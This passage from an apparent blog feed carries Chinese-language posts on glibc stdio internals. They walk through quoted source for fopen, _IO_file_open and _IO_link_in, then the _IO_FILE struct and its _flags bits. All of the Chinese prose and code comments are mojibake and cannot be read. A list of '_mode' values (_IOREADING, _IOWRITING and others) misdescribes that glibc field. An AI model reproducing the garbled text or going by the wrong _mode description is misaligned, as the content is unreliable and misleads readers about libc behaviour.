çš„å¯è¯»æ€§ã€‚</p></blockquote><p>æŠŠfpçš„vtableè®¾ç½®ä¸º_IO_file_jumpsåœ°å€</p><p><strong>&#x2F;libio&#x2F;fileops.c</strong> </p><p><strong>_IO_new_file_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_init _IO_file_init</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>&#x2F;libio&#x2F;genops.c</strong> </p><p><strong>_IO_link_in</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>_IO_LINKEDæ ‡å¿—ä½ç”¨æ¥æŒ‡ç¤ºä¸€ä¸ªstreambufå¯¹è±¡æ˜¯å¦å·²ç»è¢«æ·»åŠ åˆ°äº†_list_allé“¾è¡¨ä¸­ã€‚</p><p>å¦‚æœä¸€ä¸ªstreambufå¯¹è±¡é“¾æ¥åˆ°äº†_IO_list_allé“¾è¡¨ï¼Œåˆ™_IO_LINKEDæ ‡å¿—ä½ä¼šè¢«è®¾ç½®ä¸º1ï¼Œå¦åˆ™ä¸º0</p></blockquote><p>fp-&gt;file._flags &amp; _IO_LINKEDæ£€æµ‹åˆ°ä¸º0åˆ™è®¾ç½®ä¸º1å¹¶æŠŠ_chainè®¾ç½®ä¸ºå½“å‰_IO_list_allï¼ŒæŠŠ_IO_list_allè®¾ç½®ä¸ºå½“å‰_IO_FILE_plus</p><h3 id="IO-file-fopenæ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶"><a href="#IO-file-fopenæ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶" class="headerlink" title="_IO_file_fopenæ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶"></a><code>_IO_file_fopen</code>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶</h3><p>å›åˆ°__fopen_internalï¼Œè°ƒç”¨_IO_file_fopen</p><p><strong>libio&#x2F;fileops.c</strong></p><p><strong>_IO_file_fopen</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_fopen _IO_file_fopen</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_fopen (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">            <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  _IO_FILE *result;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    #define _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br><span class="line"><span class="comment">    å…ˆæ£€æµ‹äº†æ–‡ä»¶æ˜¯ä¸æ˜¯æ‰“å¼€ï¼Œæ‰“å¼€ç›´æ¥è¿”å›</span></span><br><span class="line"><span class="comment">    åœ¨_IO_new_file_init** è®¾ç½®äº†fp-&gt;file._fileno = -1;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    æ ¹æ®æˆ‘ä»¬fopençš„modeè®¾ç½®æ–‡ä»¶æ‰“å¼€æ¨¡å¼</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">      omode = O_RDWR;</span><br><span class="line">      read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">      oflags |= O_EXCL;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> O_CLOEXEC</span></span><br><span class="line">      oflags |= O_CLOEXEC;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      æ»¡è¶³ä¸€ä¸‹å…¶ä»–ç»„åˆmode å¦‚r+ rw+ a+ wbç­‰</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">/* Ignore.  */</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">              is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      .....................</span><br><span class="line">          .....................</span><br><span class="line">          .....................</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨</p><p><strong>_IO_file_open</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_file_open (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> posix_mode, <span class="type">int</span> prot,</span><br><span class="line">           <span class="type">int</span> read_write, <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">     </span><br><span class="line">    fdesc = open_not_cancel (filename,</span><br><span class="line">                 posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      </span><br><span class="line">    fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_fileno = fdesc;</span><br><span class="line">  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">  <span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">     update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">    &#123;</span><br><span class="line">      close_not_cancel (fdesc);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_link_in ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ç³»ç»Ÿå‡½æ•°openæ‰“å¼€æ–‡ä»¶</p><p><img src="/2023/03/30/IO-FILE-fopen/image-20230331133757733.png" alt="image-20230331133757733"></p><p>,æŠŠè¿”å›å€¼ç»™åˆ°_filenoå­—æ®µï¼Œå†æ¬¡<code>_IO_link_in</code>å‡½æ•°åŠ å…¥<code>_IO_list_all</code>é“¾è¡¨</p>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE</title>
      <link href="/2023/03/29/IO-FILE/"/>
      <url>/2023/03/29/IO-FILE/</url>
      
        <content type="html"><![CDATA[<p>æœ€åˆå­¦ä¹ cè¯­è¨€çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šç”¨fopenæ‰“å¼€ä¸€äº›æ–‡ä»¶æ¥æ“ä½œ</p><p><code>FILE *fopen(const char *filename, const char *mode)</code></p><p>è¿”å›ä¸€ä¸ªFILEæ–‡ä»¶æŒ‡é’ˆï¼Œè¿™ä¸ªFILEåˆ°åº•æ˜¯ä»€ä¹ˆå‘¢?ä»–çš„åº•å±‚æ•°æ®ç»“æ„ä»€ä¹ˆæ ·å­?éƒ½æœ‰ä»€ä¹ˆç”¨å‘¢?æˆ‘ä»¬ç»å¸¸ç”¨çš„ioå‡½æ•°åˆå’Œè¿™ä¸ªæœ‰ä»€ä¹ˆå…³ç³»å‘¢?</p><h2 id="What-is-FILE"><a href="#What-is-FILE" class="headerlink" title="What is FILE??"></a>What is FILE??</h2><p>çœ‹ä¸€ä¸‹æºç  <code>libio/libioP.h</code>ä¸­</p><p><code>typedef struct _IO_FILE FILE;</code></p><h3 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸ºå®½å­—ç¬¦å‡†å¤‡çš„ç»“æ„ä½“ defined _GLIBCPP_USE_WCHAR_T</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;          <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;          <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;         <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;        <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;         <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;         <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;          <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;           <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;         <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;       <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;          <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span>  _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span>             _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="flagså­—æ®µ"><a href="#flagså­—æ®µ" class="headerlink" title="_flagså­—æ®µ"></a>_flagså­—æ®µ</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Magic numbers and bits for the _flags field.</span></span><br><span class="line"><span class="comment">   The magic numbers use the high-order bits of _flags;</span></span><br><span class="line"><span class="comment">   the remaining bits are available for variable flags.</span></span><br><span class="line"><span class="comment">   Note: The magic numbers must all be negative if stdio</span></span><br><span class="line"><span class="comment">   emulation is desired. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure><p>_flagçš„<code>é«˜ä¸¤ä½</code>å­—èŠ‚æ˜¯ç”±libcå›ºå®šçš„Magic number</p><p><code>ä½ä¸¤ä½</code>å­—èŠ‚çš„ä½æ•°è§„åˆ™å†³å®šäº†ç¨‹åºçš„æ‰§è¡ŒçŠ¶æ€</p><p>_mode å­—æ®µ</p><ul><li><code>_IOFBF</code>ï¼ˆ0ï¼‰ï¼šæ–‡ä»¶æµæ˜¯å…¨ç¼“å†²æ¨¡å¼ã€‚</li><li><code>_IOLBF</code>ï¼ˆ1ï¼‰ï¼šæ–‡ä»¶æµæ˜¯è¡Œç¼“å†²æ¨¡å¼ã€‚</li><li><code>_IONBF</code>ï¼ˆ2ï¼‰ï¼šæ–‡ä»¶æµæ˜¯æ— ç¼“å†²æ¨¡å¼ã€‚</li><li><code>_IOREADING</code>ï¼ˆ3ï¼‰ï¼šæ–‡ä»¶æµå½“å‰æ­£åœ¨è¿›è¡Œè¯»æ“ä½œã€‚</li><li><code>_IOWRITING</code>ï¼ˆ4ï¼‰ï¼šæ–‡ä»¶æµå½“å‰æ­£åœ¨è¿›è¡Œå†™æ“ä½œã€‚</li><li><code>_IOAPPEND</code>ï¼ˆ8ï¼‰ï¼šæ–‡ä»¶æµæ˜¯ä»¥è¿½åŠ æ¨¡å¼æ‰“å¼€çš„ã€‚</li><li><code>_IOEOF</code>ï¼ˆ16ï¼‰ï¼šæ–‡ä»¶æµå·²ç»åˆ°è¾¾äº†æ–‡ä»¶çš„æœ«å°¾ã€‚</li><li><code>_IOERR</code>ï¼ˆ32ï¼‰ï¼šæ–‡ä»¶æµå‡ºç°äº†é”™è¯¯ã€‚</li><li><code>_IOSTRG</code>ï¼ˆ64ï¼‰ï¼šæ–‡ä»¶æµæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æµã€‚</li><li><code>_IORW</code>ï¼ˆ128ï¼‰ï¼šæ–‡ä»¶æµæ˜¯è¯»å†™æ¨¡å¼ã€‚</li></ul><blockquote><p>ä¸ºä»€ä¹ˆè¦æœ‰è¾“å…¥è¾“å‡ºç¼“å†²åŒºï¼Ÿ</p><p>ä¸»è¦åŸå› æ˜¯ä¸ºäº†æé«˜ç¨‹åºçš„æ€§èƒ½ã€‚è¾“å…¥è¾“å‡ºæ“ä½œé€šå¸¸æ¯”å†…å­˜æ“ä½œæ…¢å¾—å¤šï¼Œå› ä¸ºå®ƒä»¬æ¶‰åŠåˆ°ä»ç¡¬ç›˜ã€ç½‘ç»œç­‰è®¾å¤‡è¯»å–æˆ–å†™å…¥æ•°æ®ã€‚ä½¿ç”¨ç¼“å†²åŒºå¯ä»¥å‡å°‘å®é™…çš„IOæ“ä½œæ¬¡æ•°ï¼Œä»è€Œæé«˜ç¨‹åºçš„æ•ˆç‡ã€‚</p><p>è€ƒè™‘IOæ€§èƒ½å’ŒCPUæ€§èƒ½çš„å·®è·ï¼Œä¼šç¼“å­˜ä¸€æ®µbufferï¼Œè¿™æ®µbufferæ»¡æˆ–è€…å¤–éƒ¨è§¦å‘æ—¶å°±å¯ä»¥å‡ºå‘å†™å…¥æˆ–è€…è¯»å‡ºæ“ä½œäº†ã€‚</p></blockquote><p>FILE åœ¨ Linux ç³»ç»Ÿçš„æ ‡å‡† IO åº“ä¸­æ˜¯ç”¨äºæè¿°æ–‡ä»¶çš„ç»“æ„ï¼Œç§°ä¸ºæ–‡ä»¶æµã€‚</p><p>FILE ç»“æ„åœ¨ç¨‹åºæ‰§è¡Œ fopen ç­‰å‡½æ•°æ—¶ä¼šè¿›è¡Œåˆ›å»ºï¼Œå¹¶åˆ†é…åœ¨å †ä¸­ã€‚</p><p>åœ¨æ ‡å‡† I&#x2F;O 